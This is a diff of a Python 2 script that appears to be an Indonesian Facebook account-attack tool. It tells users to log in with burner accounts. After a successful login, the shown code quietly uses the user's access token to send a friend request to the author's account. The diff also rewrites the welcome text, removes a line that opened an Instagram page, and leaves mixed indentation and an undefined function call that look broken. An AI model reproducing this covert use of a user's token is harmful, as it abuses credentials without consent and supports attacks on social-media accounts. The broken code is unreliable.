@@ -77,13 +77,19 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 def intro():
-	os.system('clear')	
-		jalan(print"Selamat datang Kawan Dan mohon gunakan script ini dengan bijak :) !!")
-                jalan(print"Diharapkan Anda login dengan menggunakan akun tumbal atau baru agar akun pribadi aman :)")
-                jalan(print"\x1b[1;91mIngat Penyalahgunaan Atau Pelanggaran Di Tanggung Dosa Masing-Masing!")
+	os.system('clear')
+	nama = raw_input("\033[1;97mMasukan Namamu ? \033[1;91m: \033[1;92m")
+	if nama =="":
+		print"\033[1;96m[!] \033[1;91mIsi yang benar Goblok"
+		time.sleep(1)
+		siapa()
+	else:
+		os.system('clear')
+		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mJangan lupa bernafas dan gunakan Tolls ini dengan bijak ya sob :) !!")
+                jalan("\x1b[1;92mSaya sarankan sebelum menjalankan Tolls ini sebaiknya gunakan akun baru atau tumbal agar akun pribadi anda aman!")
+                jalan("\x1b[1;97mPenyalahgunaan dan pelanggaran di tanggung dosa masing masing !")
 		time.sleep(1)
 		loginSC()
-		
 		
 def loginSC():
 	os.system('clear')
@@ -141,7 +147,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://instagram.com/dwiirfan187')
+				
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
